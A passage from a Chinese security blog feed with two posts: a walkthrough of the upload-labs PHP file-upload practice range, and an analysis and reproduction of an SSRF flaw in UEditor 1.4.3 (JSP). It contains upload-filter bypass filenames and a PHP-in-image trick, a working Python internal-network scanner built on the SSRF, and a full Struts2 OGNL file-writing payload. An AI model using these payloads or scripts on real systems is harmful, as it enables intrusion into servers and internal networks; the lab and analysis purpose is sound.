      <url>/2018/06/04/upload-labs-writeup/</url>
      <content type="html"><![CDATA[<p><a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">upload-labs</a>是一个总结了大部分PHP上传漏洞的靶场 ，本文主要是记录一下这些常见上传漏洞的绕过方法。当然一种漏洞会有多种绕过的方法，这里暂时列举一些我所知道的解法。有些会有环境限制的，我会在其中备注出来的。</p>
<a id="more"></a>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>我这里用到的是PHPStudy2016。采用的是Apache+php，其中Apache版本为2.4，php版本按照作者所说的为5.2.17。操作系统为Win10 。然后下载upload-labs并放置在PHPStudy安装目录的WWW目录下。也可以采用作者的<a href="https://github.com/c0ny1/upload-labs/releases" target="_blank" rel="noopener">集成环境</a>。</p>
<h2 id="题目与解法"><a href="#题目与解法" class="headerlink" title="题目与解法"></a>题目与解法</h2><p>首先需要在upload-labs目录下新建upload目录。</p>
<p>然后就开始答题了。其中13-16暂时要求的是“保证上传后的图片马中仍然包含完整的<code>一句话</code>或<code>webshell</code>代码 ”，我就暂时以13题为例，其余的暂时先不做。第18题暂未解出，所以暂时先省略。</p>
<p>其他题的WriteUp如下：</p>
<h3 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h3><p>在js中判断文件，直接上传拦截后修改为php文件</p>
<p><img src="/2018/06/04/upload-labs-writeup/01.png" alt="1527750911228"></p>
<h3 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h3><p><img src="/2018/06/04/upload-labs-writeup/02.png" alt="1527751110894"></p>
<blockquote>
<p>注意需要带上<code>Content-Type: image/jpeg</code></p>
</blockquote>
<h3 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h3><h4 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h4><p>首先名字为<code>3.php:jpg</code></p>
<p><img src="/2018/06/04/upload-labs-writeup/03_01.png" alt="1527752035450"></p>
<p>会写入一个<code>3.php</code>的空文件</p>
<p>然后修改名字为<code>3.&lt;&lt;&lt;</code></p>
<p><img src="/2018/06/04/upload-labs-writeup/03_02.png" alt="1527752164570"></p>
<p>参考<a href="https://www.waitalone.cn/php-windows-upload.html" target="_blank" rel="noopener">https://www.waitalone.cn/php-windows-upload.html</a></p>
<h4 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h4><p>需要在apache httpd.conf进行配置。</p>
<p><code>AddType application/x-httpd-php .php .phtml</code></p>
<p>然后上传的文件名可以为<code>3.php.a</code>或者<code>3.phtml</code></p>
<p><img src="/2018/06/04/upload-labs-writeup/03_03.png" alt="1527832795973"></p>
<blockquote>
<p>这个解法是查看到作者给的集成环境中有这样的设置</p>
</blockquote>
<h4 id="方法3"><a href="#方法3" class="headerlink" title="方法3"></a>方法3</h4><p><img src="/2018/06/04/upload-labs-writeup/03-04.png" alt="1527836221197"></p>
<p>首先文件名为<code>3.php.::$DATA</code>会生成一个<code>3.php.</code>文件</p>
<p>再将文件名修改为<code>3.php&gt;</code></p>
<p><img src="/2018/06/04/upload-labs-writeup/03-05.png" alt="1527835503648"></p>
<blockquote>
<p>第二次的文件名还可以为<code>3.php&lt;</code> 、<code>3.php&gt;</code> 、<code>3.php\</code> 以及<code>3.php&quot;</code></p>
<p>3.php.文件直接删除不掉，可以在bash命令下删除</p>
</blockquote>
<h4 id="方法4"><a href="#方法4" class="headerlink" title="方法4"></a>方法4</h4><p>%aa url解码</p>
<p><img src="/2018/06/04/upload-labs-writeup/03-06.png" alt="1527839239501"></p>
<p>其他还有%b3、%b2等。。</p>
<h3 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h3><p>参考Pass-03的方法1、2、3、4</p>
<h3 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h3><p>参考Pass-03的方法1、2、3、4</p>
<p>没有对文件名进行小写转换，所以大小写混合或者大写可以绕过</p>
<p><img src="/2018/06/04/upload-labs-writeup/05-02.png" alt="1527840876449"></p>
<h3 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h3><p>参考Pass-03的方法1、2、3、4</p>
<p>这里没有去除空格，所以用“6.php ”即可绕过</p>
<p><img src="/2018/06/04/upload-labs-writeup/06-02.png" alt="1528077233962"></p>
<h3 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h3><p>参考Pass-03的方法1、2、3、4</p>
<p>没有删除结尾的“.”，所以用“7.php.”可以绕过</p>
<p><img src="/2018/06/04/upload-labs-writeup/07-01.png" alt="1528077415251"></p>
<h3 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h3><p>参考Pass-03的方法1、2、3、4</p>
<p>没有对字符串<code>::$DATA</code>进行操作，所以可以使用<code>8.php::$DATA</code>绕过</p>
<p><img src="/2018/06/04/upload-labs-writeup/08-01.png" alt="1527841099446"></p>
<h3 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h3><p>参考Pass-03的方法1、2、3、4</p>
<h3 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h3><p>关键代码<code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p>
<p>当后缀名中出现黑名单列表中的内容时，就替换为空，所以可以用pphphp这样的后缀绕过。</p>
<p><img src="/2018/06/04/upload-labs-writeup/10-01.png" alt="1527833585243"></p>
<h3 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h3><p>%00截断即可</p>
<p>需关闭magic_quotes_gpc</p>
<p><img src="/2018/06/04/upload-labs-writeup/11-01.png" alt="1527816997321"></p>
<blockquote>
<p>集成环境中有该设置：<code>magic_quotes_gpc = Off</code></p>
</blockquote>
<h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><p>%00截断即可，需要url解码</p>
<p>需关闭magic_quotes_gpc</p>
<p><img src="/2018/06/04/upload-labs-writeup/12-01.png" alt="1527817083878"></p>
<blockquote>
<p>集成环境中有该设置：<code>magic_quotes_gpc = Off</code></p>
</blockquote>
<h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><p>题目已经更新，要求“保证上传后的图片马中仍然包含完整的<code>一句话</code>或<code>webshell</code>代码 ”</p>
<p>这里就以png格式图片为例</p>
<p><code>copy xwz.png/b + 1.txt 1111.png</code></p>
<p>其中xwz.png为正常的png图片，1.txt内容为<code>&lt;?php echo &quot;pwn&quot;;?&gt;</code></p>
<p>查看上传后的结果</p>
<p><img src="/2018/06/04/upload-labs-writeup/13-01.png" alt="1528079960735"></p>
<p>当然也可以直接用hex工具打开图片，在最后追加php代码。</p>
<blockquote>
<p>14-16和该题要求类似，统一按该方法处理。步骤省略。</p>
</blockquote>
<h3 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h3><p>参考Pass-03方法1</p>
<p>文件名为：“17.php:.jpg”,上传成功后会生成一个17.php空文件，将文件名改为“17.&lt;&lt;&lt;”后再次上传</p>
<p><img src="/2018/06/04/upload-labs-writeup/17-01.png" alt="1528080850165"></p>
<p><img src="/2018/06/04/upload-labs-writeup/17-02.png" alt="1528080900372"></p>
<h3 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h3><p>save_name修改为“upload-19.php.”即可</p>
<p><img src="/2018/06/04/upload-labs-writeup/19-01.png" alt="1528081520987"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里面比较通杀的方法是采用<code>aaa.php:jpg</code> 的方法生成一个<code>aaa.php</code>的空文件，然后使用<code>aaa.&lt;&lt;&lt;</code>再次写入文件内容。可以参考<a href="https://www.waitalone.cn/php-windows-upload.html" target="_blank" rel="noopener">当php邂逅windows通用上传缺陷</a>这篇文章，里面介绍的很详细。</p>
<p>本文主要用到的绕过方式有：</p>
<ol>
<li><p>修改js绕过（或者上传图片格式后抓包修改）</p>
</li>
<li><p>利用文件名<code>aaa.php:jpg</code> 的方法生成一个<code>aaa.php</code>的空文件，然后使用<code>aaa.&lt;&lt;&lt;</code>再次写入文件内容</p>
</li>
<li><p>使用<code>3.php::$DATA</code> 绕过</p>
</li>
<li><p>文件名进行小写绕过</p>
</li>
<li><p>“abc.php.” 绕过</p>
</li>
<li><p>“abc.pphphp”绕过</p>
</li>
<li><p>%00截断绕过</p>
</li>
<li><p>URL解码绕过（参考Pass-03)方法4</p>
</li>
</ol>
<p>本文只是给了部分解题的答案，没有过多的描述思路。每道题的解法也不是那么单一固定的。其中Pass-03到Pass-09都可以利用Pass-03的四种方法。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><p><a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a></p>
</li>
<li><p><a href="https://www.waitalone.cn/php-windows-upload.html" target="_blank" rel="noopener">https://www.waitalone.cn/php-windows-upload.html</a></p>
</li>
</ul>
]]></content>
      
        <categories>
            
            <category> Exploit </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[UEditor SSRF漏洞(JSP版本)分析与复现]]></title>
      <url>/2018/05/25/UEditor-SSRF-In-JSP/</url>
      <content type="html"><![CDATA[<p>前些时间测试的时候遇到了一个系统采用了UEditor编辑器，版本为1.4.3。已知该编辑器v1.4.3版本（jsp)存在SSRF漏洞，虽然是Bool型的SSRF，除了可以进行内网探测外，也可以根据web应用指纹信息，之后进行进一步的测试。</p>
<a id="more"></a>
<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>查看官方的<a href="http://ueditor.baidu.com/website/changelog.html" target="_blank" rel="noopener">更新日志</a>可以发现UEditor编辑器在版本1.4.3.1修复了SSRF漏洞。<img src="/2018/05/25/UEditor-SSRF-In-JSP/01.png" alt="01"></p>
<p>那版本1.4.3应该存在SSRF漏洞，本着能搜索就不动手的原则搜了一下，发现<code>wooyun-2015-0133125</code>中提到过这类的漏洞。但我这里是jsp版本的，里面提到jsp版本不一样，只好去分析一下漏洞产生的位置。</p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>那我们需要查看版本1.4.3与1.4.3.1有什么不同，从而找到存在问题的地方。该项目的代码托管在Github上，地址为：<a href="https://github.com/fex-team/ueditor/" target="_blank" rel="noopener">https://github.com/fex-team/ueditor/</a> 。</p>
<p>查看版本1.4.3.1下的<a href="https://github.com/fex-team/ueditor/tree/v1.4.3.1/jsp" target="_blank" rel="noopener">jsp代码</a>.</p>
<p><img src="/2018/05/25/UEditor-SSRF-In-JSP/02.png" alt="02"></p>
<p>可以发现在该版本有一次commit，commitId 为<code>a1820147cfc3fbe2960a7d99f8dfbe338c02f0b6</code>。根据字面意思应该是增加了修复SSRF的代码。</p>
<p>下载下来后对比一下v1.4.3.1和v1.4.3代码有什么不同(这里仅对比jsp下的代码)。</p>
<p><img src="/2018/05/25/UEditor-SSRF-In-JSP/03.png" alt="03"></p>
<p>发现在v1.4.3.1中修改了jsp/src/com/baidu/ueditor/hunter/ImageHunter.java的<code>validHost</code>方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">validHost</span> <span class="params">( String hostname )</span> </span>&#123;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		InetAddress ip = InetAddress.getByName(hostname);<span class="comment">//根据主机名获取ip</span></span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (ip.isSiteLocalAddress()) &#123;<span class="comment">//是否为地区本地地址</span></span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (UnknownHostException e) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> !filters.contains( hostname );</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>新增了对ip地址是否为内部地址的判断。而在v1.4.3中仅仅是做了是否为过滤的ip地址。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">validHost</span> <span class="params">( String hostname )</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> !filters.contains( hostname );</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>isSiteLocalAddress</code>方法作用是当IP地址是地区本地地址（SiteLocalAddress）时返回true，否则返回false。</p>
<blockquote>
<p>IPv4的地址本地地址分为三段：10.0.0.0 ~ 10.255.255.255、172.16.0.0 ~ 172.31.255.255、192.168.0.0 ~ 192.168.255.255。</p>
</blockquote>
<p>搜索后发现在<code>captureRemoteData</code>中调用了<code>validHost</code>方法。</p>
<p> <img src="/2018/05/25/UEditor-SSRF-In-JSP/04.png" alt="05"></p>
<p>根据代码可以分析：首先使用<code>validHost</code>对url进行判断，如果不合法，就提示“被阻止的远程主机”；当满足条件后会使用<code>validContentState</code>方法查看返回的状态是否为200，若不为200，则提示“远程连接出错”；进而对后缀、文件大小进行判断，都符合之后才进行图片的保存。如果url无法访问，则提示“抓取远程图片失败”。</p>
<p>所以可以根据返回的内容，来推断该url对应的主机是否可以访问。由于在版本v1.4.3中没有对请求的主机进行验证，从而造成了SSRF漏洞。</p>
<p>继续查看在<code>capture</code>方法中调用了<code>captureRemoteData</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> State <span class="title">capture</span> <span class="params">( String[] list )</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	MultiState state = <span class="keyword">new</span> MultiState( <span class="keyword">true</span> );</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> ( String source : list ) &#123;</span><br><span class="line">		state.addState( captureRemoteData( source ) );</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> state;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>invoke</code>中调用了<code>capture</code>.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">invoke</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> ( actionType == <span class="keyword">null</span> || !ActionMap.mapping.containsKey( actionType ) ) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> BaseState( <span class="keyword">false</span>, AppInfo.INVALID_ACTION ).toJSONString();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">		...</span><br><span class="line">	</span><br><span class="line">	State state = <span class="keyword">null</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> actionCode = ActionMap.getType( <span class="keyword">this</span>.actionType );</span><br><span class="line">	</span><br><span class="line">		...</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">switch</span> ( actionCode ) &#123;</span><br><span class="line">	</span><br><span class="line">		...</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">case</span> ActionMap.CATCH_IMAGE:</span><br><span class="line">			conf = configManager.getConfig( actionCode );</span><br><span class="line">			String[] list = <span class="keyword">this</span>.request.getParameterValues( (String)conf.get( <span class="string">"fieldName"</span> ) );</span><br><span class="line">			state = <span class="keyword">new</span> ImageHunter( conf ).capture( list );</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		...			</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> state.toJSONString();</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当调用<code>capture</code>需要满足条件为<code>actionCode</code>为<code>ActionMap.CATCH_IMAGE</code>，在<code>ActionMap</code>中value为<code>ActionMap.CATCH_IMAGE对应的</code>key为<code>catchimage。所以</code>当<code>actionType</code>值为<code>catchimage</code>，即<code>action</code>参数对应为<code>catchimage</code>时，才可能触发SSRF漏洞。下面对漏洞进行验证。</p>
<h2 id="0x03-漏洞验证"><a href="#0x03-漏洞验证" class="headerlink" title="0x03 漏洞验证"></a>0x03 漏洞验证</h2><p>这里用的是v1.4.3 jsp版本，下载ueditor1_4_3-utf8-jsp.zip，之后进行配置（可以参考<a href="http://fex.baidu.com/ueditor/#server-jsp）。" target="_blank" rel="noopener">http://fex.baidu.com/ueditor/#server-jsp）。</a></p>
<p><img src="/2018/05/25/UEditor-SSRF-In-JSP/05.png" alt="04"></p>
<p>功能实现的入口文件是jsp/controller.jsp。由上述分析可知需要满足<code>action</code>参数为<code>catchimage</code>。</p>
<p>在<code>case ActionMap.CATCH_IMAGE</code>中下断点，然后进行调试。</p>
<p>访问链接<a href="http://localhost:8088/jsp/controller.jsp?action=catchimage" target="_blank" rel="noopener">http://localhost:8088/jsp/controller.jsp?action=catchimage</a></p>
<p><img src="/2018/05/25/UEditor-SSRF-In-JSP/06.png" alt="1527146004264"></p>
<p>继续运行发现list为空，然后就抛出了异常。</p>
<p>再次运行，查看list数据从何而来。</p>
<p><img src="/2018/05/25/UEditor-SSRF-In-JSP/07.png" alt="1527146184688"></p>
<p>可以看出list的数据从浏览器source[]参数而来。这里source[]需要后缀为图片格式，具体可以查看config.js中的<code>catcherAllowFiles</code>。</p>
<p>已知192.168.135.133开启了tomcat服务，且端口为8080。我们这里访问一张不存在的图片，例如用UUID生成一张图片的名称。</p>
<p>构造请求链接：<a href="http://localhost:8088/jsp/controller.jsp?action=catchimage&amp;source[]=http://192.168.135.133:8080/0f3927bc-5f26-11e8-9c2d-fa7ae01bbebc.png" target="_blank" rel="noopener">http://localhost:8088/jsp/controller.jsp?action=catchimage&amp;source[]=http://192.168.135.133:8080/0f3927bc-5f26-11e8-9c2d-fa7ae01bbebc.png</a></p>
<p><img src="/2018/05/25/UEditor-SSRF-In-JSP/08.png" alt="1527151024365"></p>
<p>当进入<code>validHost</code>方法时，由于被访问的主机地址不在过滤的范围，所以返回true。</p>
<blockquote>
<p>这里可以发现，仅仅对<code>127.0.0.1</code>、<code>localhost</code>和<code>img.baidu.com</code>进行了限制，当ip为本地地址时并没有限制，从而可以进行内网探测。</p>
</blockquote>
<p><img src="/2018/05/25/UEditor-SSRF-In-JSP/09.png" alt="1527151160299"></p>
<p>而该图片由于不存在，所以状态码为404，到此抓取图片过程结束，并返回结果。</p>
<p>这里可以根据页面返回的结果不同，来判断该地址对应的主机端口是否开放。可以总结为以下几点：</p>
<ol>
<li>如果抓取不存在的图片地址时，页面返回<code>{&quot;state&quot;: &quot;SUCCESS&quot;, list: [{&quot;state&quot;: &quot;\u8fdc\u7a0b\u8fde\u63a5\u51fa\u9519&quot;} ]}</code>，即state为“远程连接出错”。</li>
<li>如果成功抓取到图片，页面返回<code>{&quot;state&quot;: &quot;SUCCESS&quot;, list: [{&quot;state&quot;: &quot;SUCCESS&quot;,&quot;size&quot;: &quot;5103&quot;,&quot;source&quot;: &quot;http://192.168.135.133:8080/tomcat.png&quot;,&quot;title&quot;: &quot;1527173588127099881.png&quot;,&quot;url&quot;: &quot;/ueditor/jsp/upload/image/20180524/1527173588127099881.png&quot;} ]}</code>，即state为“SUCCESS”。</li>
<li>如果主机无法访问，页面返回<code>{&quot;state&quot;: &quot;SUCCESS&quot;, list: [{&quot;state&quot;: &quot;\u6293\u53d6\u8fdc\u7a0b\u56fe\u7247\u5931\u8d25&quot;} ]}</code>，即state为“抓取远程图片失败”。</li>
</ol>
<blockquote>
<p>由于除了在config.js中的<code>catcherLocalDomain</code>配置了过滤的地址外，没有针对内部地址进行过滤，所以可以根据抓取远程图片返回结果的不同，来进行内网的探测。</p>
</blockquote>
<h2 id="0x04-代码实现"><a href="#0x04-代码实现" class="headerlink" title="0x04 代码实现"></a>0x04 代码实现</h2><p>由上述分析，根据返回包中的state进行判断，当state为<code>&quot;远程连接出错&quot;</code>或者为”SUCCESS”时表示该主机存在，且对应的端口为开放状态。</p>
<p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">__Date__=<span class="string">"20180524"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Usage:</span></span><br><span class="line"><span class="string">    python SSRF_Ueditor_jsp.py http://localhost:8088/ 192.168.135.133</span></span><br><span class="line"><span class="string">	python SSRF_Ueditor_jsp.py http://localhost:8088/ 192.168.135.0/24</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">Python version: 3.6.2</span></span><br><span class="line"><span class="string">requirements:IPy==0.83</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> IPy <span class="keyword">import</span> IP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(url,ip,port)</span>:</span></span><br><span class="line">	url = <span class="string">'%s/jsp/controller.jsp?action=catchimage&amp;source[]=http://%s:%s/0f3927bc-5f26-11e8-9c2d-fa7ae01bbebc.png'</span> % (url,ip,port)</span><br><span class="line">	res = requests.get(url)</span><br><span class="line">	result = res.text</span><br><span class="line">	result = result.replace(<span class="string">"list"</span>,<span class="string">"\"list\""</span>)</span><br><span class="line">	res_json = json.loads(result)</span><br><span class="line">	state = res_json[<span class="string">'list'</span>][<span class="number">0</span>][<span class="string">'state'</span>]</span><br><span class="line">	<span class="keyword">if</span> state == <span class="string">'远程连接出错'</span> <span class="keyword">or</span> state == <span class="string">'SUCCESS'</span>:</span><br><span class="line">		print(ip,port,<span class="string">'is Open'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(url,ip)</span>:</span></span><br><span class="line"></span><br><span class="line">	ips = IP(ip)</span><br><span class="line">	ports = [<span class="number">80</span>,<span class="number">8080</span>]</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> ips:</span><br><span class="line">		<span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line">			check(url,i,port)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	url = sys.argv[<span class="number">1</span>]</span><br><span class="line">	ip = sys.argv[<span class="number">2</span>]</span><br><span class="line">	main(url,ip)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>由于返回的结果为<code>{&quot;state&quot;: &quot;SUCCESS&quot;, list: [{&quot;state&quot;: &quot;...&quot;} ]}</code>并不能直接用json来解析，需要将list替换为”list”后才可以作为json来解析。当然也可以直接使用burp来测试。</p>
</blockquote>
<p>在实际测试中的测试结果如下：</p>
<p><img src="/2018/05/25/UEditor-SSRF-In-JSP/10.png" alt="1527148655823"></p>
<h2 id="0x05-综合利用"><a href="#0x05-综合利用" class="headerlink" title="0x05 综合利用"></a>0x05 综合利用</h2><p>对于这样的Bool型SSRF ，页面仅返回了状态，而没有更多别的信息，要想进一步利用，可以根据如下的思路：</p>
<p><code>内网探测-&gt;应用识别-&gt;攻击Payload-&gt;查看结果</code></p>
<h3 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h3><p>首先进行内网探测，查看内网开放的主机和端口。这里以本地为例。</p>
<p>执行命令：</p>
<p><code>python SSRF_Ueditor_jsp.py http://localhost:8088/ 192.168.135.155</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.135.155 80 is Open</span><br><span class="line"></span><br><span class="line">192.168.135.155 8080 is Open</span><br></pre></td></tr></table></figure>
<p>发现端口80 和 8080 开放，然后进行应用的识别。</p>
<h3 id="应用识别"><a href="#应用识别" class="headerlink" title="应用识别"></a>应用识别</h3><p>80端口由于没有可以识别的特征，所以未识别到应用的类型，而8080端口可以识别出来为tomcat服务器。</p>
<p><img src="/2018/05/25/UEditor-SSRF-In-JSP/11.png" alt="1527175485827"></p>
<p>然后尝试查看是否存在Struts2漏洞。</p>
<h3 id="攻击Payload"><a href="#攻击Payload" class="headerlink" title="攻击Payload"></a>攻击Payload</h3><p>由于在抓取远程图片时，会请求给出的URL地址，所以可以利用Struts2漏洞在内网服务器（这里为192.168.135.155）上写入一个后缀为图片格式（如png、jpg)的文件（因为只能抓取图片格式的文件，所以这里写入了图片后缀的文件），然后利用Ueditor抓取图片的功能，将写入的图片文件抓取到ueditor服务器中，然后访问图片查看攻击结果。</p>
<p>首先写文件，这里利用Struts2漏洞在内网服务器web项目下写入一个名字为b5e592d2-ab5b-476d-865a-8299a0625490.png的文件，内容为<code>Struts2_Test.png</code>。</p>
<p><img src="/2018/05/25/UEditor-SSRF-In-JSP/12.png" alt="1527181406261"></p>
<blockquote>
<p>这里之所以写入内容为<code>Struts2_Test.png</code>，是由于在抓取图片时会判断图片链接的后缀是否为图片格式。当然还有其他的写法，例如</p>
<p><a href="http://192.168.135.135:8080/Struts2_bugs-0.0.1-SNAPSHOT/test.action%3Fredirect%253A%24%257B%2523req%253d%2523context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;),%2523b%253D%2523req.getRealPath(%2522/%2522)%252B&#39;b5e592d2-ab5b-476d-865a-8299a0625490.png&#39;,%2523res%253d%2523context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%2523res.getWriter().print(%2522oko%2522),%2523res.getWriter().print(%2522kok%2522),%2523res.getWriter().flush(),%2523res.getWriter().close(),new%2520java.io.BufferedWriter(new%2520java.io.FileWriter(%2523b)).append(%2523req.getParameter(%2522shell%2522)).close()%257D%26shell%3DStruts2_Test&amp;aaa.png也可以写入。" target="_blank" rel="noopener">http://192.168.135.135:8080/Struts2_bugs-0.0.1-SNAPSHOT/test.action%3Fredirect%253A%24%257B%2523req%253d%2523context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;),%2523b%253D%2523req.getRealPath(%2522/%2522)%252B&#39;b5e592d2-ab5b-476d-865a-8299a0625490.png&#39;,%2523res%253d%2523context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%2523res.getWriter().print(%2522oko%2522),%2523res.getWriter().print(%2522kok%2522),%2523res.getWriter().flush(),%2523res.getWriter().close(),new%2520java.io.BufferedWriter(new%2520java.io.FileWriter(%2523b)).append(%2523req.getParameter(%2522shell%2522)).close()%257D%26shell%3DStruts2_Test&amp;aaa.png也可以写入。</a></p>
</blockquote>
<p>然后再次利用Ueditor抓取远程图片的功能将写入内网服务器的“图片文件”抓取下来，查看其内容。</p>
